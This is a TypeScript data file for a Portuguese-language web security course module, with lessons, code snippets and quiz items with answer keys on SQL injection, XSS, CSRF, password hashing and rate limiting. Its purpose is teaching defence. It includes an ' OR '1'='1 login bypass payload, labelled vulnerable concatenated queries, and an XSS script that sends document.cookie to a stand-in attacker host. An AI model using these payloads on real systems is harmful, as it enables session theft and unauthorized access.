import type { Module } from '../types';

export const mes19: Module = {
  id: 'mes-19',
  month: 19,
  phase: 4,
  track: 'devops',
  title: 'Segurança e Hacking Ético',
  emoji: '🛡️',
  tagline: 'Pensar como atacante pra defender melhor.',
  intro:
    'Esse módulo é sobre entender como sistemas são atacados de verdade, pra você saber exatamente o que defender. Não é sobre virar criminoso — é sobre o mesmo raciocínio que pentesters profissionais usam: encontrar a falha antes que alguém mal-intencionado encontre. Toda técnica aqui só deve ser testada em ambiente próprio ou com autorização explícita — testar em sistema de terceiros sem permissão é crime em praticamente todo lugar do mundo, e isso vale mesmo "só pra ver se funciona".',
  lessons: [
    {
      id: 'l1',
      heading: 'SQL Injection: o clássico que ainda derruba sistema todo dia',
      body:
        'SQL Injection acontece quando você monta uma {{query}} colando texto do usuário direto na string, sem tratar. Se o usuário digitar algo que parece SQL de verdade, o banco executa esse SQL como se fosse parte da consulta original — o atacante literalmente reescreve sua query.\n\nO exemplo clássico: um login que monta a query assim. Se o atacante digitar `\' OR \'1\'=\'1` no campo de senha, a condição vira sempre verdadeira, e ele entra sem saber senha nenhuma.',
      codeExample: {
        lang: 'javascript',
        code: '// VULNERÁVEL — nunca faça isso\nconst query = `SELECT * FROM usuarios WHERE email = \'${email}\' AND senha = \'${senha}\'`;\n\n// SEGURO — usa parâmetros, o banco trata o valor como dado, nunca como código\nconst query = \'SELECT * FROM usuarios WHERE email = $1 AND senha = $2\';\ndb.query(query, [email, senha]);',
      },
      diagramId: 'sql-injection',
    },
    {
      id: 'l2',
      heading: 'Como se defender de SQL Injection na prática',
      body:
        'A defesa de verdade é simples: **nunca** monte query concatenando string direto do usuário. Use **prepared statements** (queries parametrizadas) — o `$1`, `$2` do exemplo anterior, ou `?` dependendo da biblioteca. O banco trata esses valores como dado puro, nunca como comando, então não importa o que o usuário digite, não tem como "escapar" da query.\n\nORMs como Prisma, TypeORM, Sequelize (que você já usa no dia a dia) já fazem isso por padrão — o risco real aparece quando alguém escreve SQL "cru" misturado com string do usuário, geralmente achando que vai ser mais rápido ou mais "controlado" fazer manualmente.',
      codeExample: {
        lang: 'javascript',
        code: '// Com Prisma, isso já é seguro por padrão\nconst usuario = await prisma.usuario.findFirst({\n  where: { email: emailDoUsuario, senha: senhaDoUsuario },\n});',
      },
    },
    {
      id: 'l3',
      heading: 'XSS: injetando código no navegador de outra pessoa',
      body:
        'Cross-Site Scripting (XSS) é quando um atacante consegue injetar JavaScript que roda no navegador de **outro usuário** do seu site. Imagina um campo de comentário que aceita qualquer texto e mostra ele direto na tela sem tratar — se alguém comentar `<script>roubarCookie()</script>`, esse código roda na tela de quem ler o comentário.\n\nCom isso, o atacante pode roubar o {{token}} de sessão de quem visitar a página, redirecionar pra um site falso, ou fazer ações em nome da vítima sem ela saber.',
      codeExample: {
        lang: 'html',
        code: '<!-- Se o app só fizer isso, é vulnerável -->\n<div>{{ comentario.texto }}</div>\n\n<!-- Comentário malicioso enviado pelo atacante -->\n<script>fetch("https://site-do-atacante.com?cookie=" + document.cookie)</script>',
      },
    },
    {
      id: 'l4',
      heading: 'Como se defender de XSS',
      body:
        'A defesa principal é **escapar** qualquer conteúdo vindo de usuário antes de mostrar na tela — transformar `<script>` em texto literal, que o navegador não interpreta como código. A boa notícia: React, Vue e a maioria dos frameworks modernos já fazem isso automaticamente quando você renderiza uma variável normal — o perigo real está em usar coisas como `dangerouslySetInnerHTML` (React) sem sanitizar antes.\n\nOutra camada de defesa é o header `Content-Security-Policy`, que diz ao navegador quais origens de script são permitidas — mesmo que um script malicioso seja injetado, o navegador recusa executar se ele vier de uma origem não autorizada.',
      codeExample: {
        lang: 'jsx',
        code: '// Seguro: React escapa automaticamente\n<div>{comentario.texto}</div>\n\n// PERIGOSO: só use se o conteúdo já passou por uma biblioteca de sanitização (ex: DOMPurify)\n<div dangerouslySetInnerHTML={{ __html: comentario.texto }} />',
      },
    },
    {
      id: 'l5',
      heading: 'CSRF: fazendo a vítima clicar sem saber',
      body:
        'Cross-Site Request Forgery é quando um site malicioso faz seu navegador enviar uma requisição pra outro site onde você já está logado, sem você perceber. Exemplo: você está logado no seu banco numa aba, e em outra aba abre um site malicioso que tem um formulário escondido que, ao carregar a página, envia automaticamente uma transferência pro banco — usando seu cookie de sessão que o navegador manda automaticamente.\n\nA defesa padrão é o **CSRF token**: um valor único gerado pelo servidor, incluído em cada formulário, que o servidor verifica antes de aceitar a ação. Um site malicioso não tem como adivinhar esse token, então a requisição forjada é rejeitada.',
      codeExample: {
        lang: 'html',
        code: '<form action="/transferir" method="POST">\n  <input type="hidden" name="csrf_token" value="a1b2c3d4-token-unico-da-sessao">\n  <input type="number" name="valor">\n  <button>Transferir</button>\n</form>',
      },
    },
    {
      id: 'l6',
      heading: 'Senhas: hash, salt, e por que nunca guardar senha em texto puro',
      body:
        'Guardar senha em texto puro no banco é um dos piores erros de segurança que existem — se o banco for vazado (e bancos de dados vazam, é uma questão de "quando", não "se"), todas as senhas ficam expostas instantaneamente. A prática correta é guardar um {{hash}} da senha, nunca a senha em si.\n\nMas hash simples não basta: duas pessoas com a mesma senha gerariam o mesmo hash, e um atacante pode usar uma "rainbow table" (tabela pré-calculada de hashes comuns) pra descobrir senhas fracas rapidamente. Por isso se usa **salt**: um valor aleatório único por usuário, misturado com a senha antes do hash — mesmo senhas iguais geram hashes diferentes. Bibliotecas como `bcrypt` já fazem isso tudo automaticamente, com um custo computacional propositalmente alto pra dificultar tentativas em massa.',
      codeExample: {
        lang: 'javascript',
        code: 'import bcrypt from "bcrypt";\n\n// Ao cadastrar:\nconst hash = await bcrypt.hash(senhaDigitada, 10); // 10 = "custo", gera o salt automaticamente\nawait db.usuario.create({ data: { email, senha: hash } });\n\n// Ao logar:\nconst confere = await bcrypt.compare(senhaDigitada, usuario.senha);',
      },
      diagramId: 'hash-salt',
    },
    {
      id: 'l7',
      heading: 'Brute force e rate limiting: travando tentativas repetidas',
      body:
        'Um ataque de força bruta é simplesmente tentar várias senhas (ou várias combinações de usuário/senha) até acertar, geralmente automatizado com um script que testa milhares por segundo. Sem proteção, isso eventualmente funciona contra senhas fracas.\n\nA defesa básica é **rate limiting**: limitar quantas tentativas de login uma mesma origem (IP, ou conta) pode fazer num intervalo de tempo, bloqueando temporariamente depois de N tentativas erradas. Outra camada comum é exigir CAPTCHA depois de algumas tentativas falhas, e notificar o usuário por email quando há tentativas de login suspeitas.',
      codeExample: {
        lang: 'javascript',
        code: 'import rateLimit from "express-rate-limit";\n\nconst limiteLogin = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutos\n  max: 5, // só 5 tentativas nesse intervalo\n  message: "Muitas tentativas. Tente novamente em 15 minutos.",\n});\n\napp.post("/login", limiteLogin, loginHandler);',
      },
    },
    {
      id: 'l8',
      heading: 'OWASP Top 10: a lista que todo dev deveria conhecer',
      body:
        'A OWASP (Open Worldwide Application Security Project) mantém uma lista atualizada periodicamente das vulnerabilidades mais críticas e comuns em aplicações web — é basicamente o "resumo do que mais derruba sistema" compilado por especialistas do mundo todo. Praticamente todo processo de segurança sério em empresas usa essa lista como referência.\n\nAlém de SQL Injection e XSS (que você já viu), a lista cobre: controle de acesso quebrado (usuário acessa dados de outro usuário só mudando um ID na URL), configuração de segurança incorreta (deixar configurações padrão/inseguras em produção), e componentes vulneráveis e desatualizados (usar uma biblioteca com falha conhecida e nunca atualizar). Vale a pena ler a lista completa pelo menos uma vez — ela muda como você revisa seu próprio código.',
    },
    {
      id: 'l9',
      heading: 'Pentest e bug bounty: hacking ético como profissão',
      body:
        'Um **pentest** (teste de penetração) é uma simulação de ataque contratada pela própria empresa, pra encontrar falhas antes que um atacante real encontre — o pentester tem permissão explícita e documentada pra tentar invadir, e entrega um relatório detalhado do que encontrou.\n\n**Bug bounty** é parecido, mas aberto: empresas como Google, Meta e bancos pagam recompensas (de centenas a milhões de dólares, dependendo da gravidade) pra quem encontrar e reportar vulnerabilidades de forma responsável, através de programas como HackerOne ou Bugcrowd. É uma carreira real e bem remunerada — muita gente que aprende essas técnicas migra pra trabalhar especificamente como pentester ou em times de segurança ofensiva ("red team"), em vez de seguir como dev tradicional.',
    },
  ],
  resources: [
    { label: 'OWASP Top 10', url: 'https://owasp.org/www-project-top-ten/' },
    { label: 'PortSwigger Web Security Academy (gratuito)', url: 'https://portswigger.net/web-security' },
    { label: 'HackerOne', url: 'https://www.hackerone.com' },
    { label: 'TryHackMe', url: 'https://tryhackme.com' },
  ],
  checklist: [
    { id: 'c1', label: 'Entendi SQL Injection e como prevenir' },
    { id: 'c2', label: 'Entendi XSS e como prevenir' },
    { id: 'c3', label: 'Entendi CSRF e como prevenir' },
    { id: 'c4', label: 'Implementei hash+salt de senha num projeto' },
    { id: 'c5', label: 'Li o OWASP Top 10 completo' },
    { id: 'c6', label: 'Configurei rate limiting numa API real' },
  ],
  goalLabel: 'Saber identificar e corrigir as vulnerabilidades mais comuns antes que cheguem em produção.',
  exercises: [
    {
      type: 'mcq',
      id: 'm19-e1',
      prompt: 'O que torna esse código vulnerável a SQL Injection?',
      code: 'const query = `SELECT * FROM usuarios WHERE id = ${idDoUsuario}`;',
      options: [
        'Usar template string é sempre inseguro',
        'O valor vindo do usuário é colado direto na query, sem ser tratado como parâmetro — um atacante pode inserir SQL malicioso nesse valor',
        'O código está vulnerável só se o banco for MySQL',
        'Não há vulnerabilidade nenhuma nesse código',
      ],
      correctIndex: 1,
      explanation: 'Sempre que um valor de usuário entra direto na string da query, sem ser tratado como parâmetro separado, existe risco de SQL Injection — o atacante pode inserir SQL que altera o comportamento da query original.',
    },
    {
      type: 'code-fill',
      id: 'm19-e2',
      prompt: 'Complete a forma segura de fazer essa query, usando parâmetro em vez de concatenar string.',
      codeTemplate: "db.query('SELECT * FROM usuarios WHERE email = ___', [email]);",
      answer: '$1',
      hint: 'O placeholder que o driver de Postgres usa pra indicar "aqui vai o primeiro parâmetro da lista".',
      explanation: '`$1` é substituído pelo valor de `email` de forma segura pelo driver — o banco nunca interpreta esse valor como parte do comando SQL, só como dado.',
    },
    {
      type: 'truefalse',
      id: 'm19-e3',
      prompt: 'React escapa automaticamente conteúdo renderizado normalmente (ex: {variavel}), prevenindo XSS na maioria dos casos.',
      answer: true,
      explanation: 'React escapa o conteúdo por padrão ao renderizar — o risco de XSS aparece principalmente quando se usa dangerouslySetInnerHTML sem sanitizar o conteúdo antes.',
    },
    {
      type: 'mcq',
      id: 'm19-e4',
      prompt: 'Qual o propósito de um CSRF token num formulário?',
      options: [
        'Criptografar os dados do formulário',
        'Garantir que a requisição realmente partiu do seu próprio site, e não foi forjada por outro site usando a sessão da vítima',
        'Acelerar o envio do formulário',
        'Validar o formato do email digitado',
      ],
      correctIndex: 1,
      explanation: 'Um site malicioso não tem como conhecer o CSRF token gerado pelo servidor legítimo, então uma requisição forjada por ele é rejeitada por faltar (ou ter errado) esse token.',
    },
    {
      type: 'mcq',
      id: 'm19-e5',
      prompt: 'Por que usar "salt" junto com o hash de senha, em vez de só fazer hash da senha pura?',
      options: [
        'Salt deixa a senha mais fácil de lembrar',
        'Salt garante que senhas iguais gerem hashes diferentes, dificultando ataques com tabelas pré-calculadas (rainbow tables)',
        'Salt é só uma formalidade sem efeito real',
        'Salt substitui completamente a necessidade de hash',
      ],
      correctIndex: 1,
      explanation: 'Sem salt, duas pessoas com a mesma senha teriam o mesmo hash — um atacante com uma rainbow table descobriria ambas as senhas de uma vez. O salt único por usuário elimina esse atalho.',
    },
    {
      type: 'mcq',
      id: 'm19-e6',
      prompt: 'O que rate limiting numa rota de login ajuda a prevenir?',
      options: [
        'Vazamento de dados do banco',
        'Ataques de força bruta — tentativas automatizadas e repetidas de adivinhar senha',
        'Ataques de SQL Injection',
        'Problemas de performance do banco apenas',
      ],
      correctIndex: 1,
      explanation: 'Limitar o número de tentativas de login num intervalo de tempo torna ataques de força bruta impraticáveis, já que o atacante não consegue testar milhares de combinações rapidamente.',
    },
    {
      type: 'match',
      id: 'm19-e7',
      prompt: 'Associe cada vulnerabilidade à sua descrição.',
      pairs: [
        { left: 'SQL Injection', right: 'Inserir SQL malicioso através de um campo de entrada não tratado' },
        { left: 'XSS', right: 'Injetar JavaScript que roda no navegador de outro usuário' },
        { left: 'CSRF', right: 'Forjar uma requisição usando a sessão já autenticada da vítima' },
      ],
      explanation: 'Cada uma explora uma camada diferente: SQL Injection ataca o banco, XSS ataca outros usuários através do seu site, CSRF abusa da sessão autenticada da vítima em outro site.',
    },
    {
      type: 'truefalse',
      id: 'm19-e8',
      prompt: 'Testar técnicas de invasão em um sistema de terceiros, sem autorização explícita, é legal desde que você não cause dano nenhum.',
      answer: false,
      explanation: 'Acessar ou tentar invadir sistemas sem autorização é crime na maioria dos países, independente de causar dano ou não — pentest e bug bounty sempre exigem permissão explícita e documentada antes de qualquer teste.',
    },
    {
      type: 'mcq',
      id: 'm19-e9',
      prompt: 'O que é a OWASP Top 10?',
      options: [
        'Uma certificação obrigatória para desenvolvedores',
        'Uma lista, atualizada periodicamente, das vulnerabilidades mais críticas e comuns em aplicações web, mantida por especialistas de segurança',
        'Um framework de testes automatizados',
        'Uma linguagem de programação focada em segurança',
      ],
      correctIndex: 1,
      explanation: 'A OWASP Top 10 é uma referência amplamente usada na indústria para entender e priorizar os riscos de segurança mais relevantes em aplicações web.',
    },
    {
      type: 'mcq',
      id: 'm19-e10',
      prompt: 'Qual a diferença entre um pentest e um programa de bug bounty?',
      options: [
        'São exatamente a mesma coisa',
        'Pentest é uma contratação específica e fechada para testar um sistema; bug bounty é um programa aberto que recompensa qualquer pessoa que reporte vulnerabilidades de forma responsável',
        'Bug bounty é ilegal, pentest não',
        'Pentest só existe para bancos',
      ],
      correctIndex: 1,
      explanation: 'Pentest é um trabalho contratado e delimitado; bug bounty é um programa contínuo e aberto a qualquer pesquisador de segurança que siga as regras estabelecidas pela empresa.',
    },
  ],
  games: [
    {
      gameId: 'vulnerability-hunter',
      label: 'Caça-Vulnerabilidade',
      description: 'Encontre a linha com a falha de segurança em trechos reais de código — SQL Injection, XSS, CSRF e mais.',
    },
  ],
};
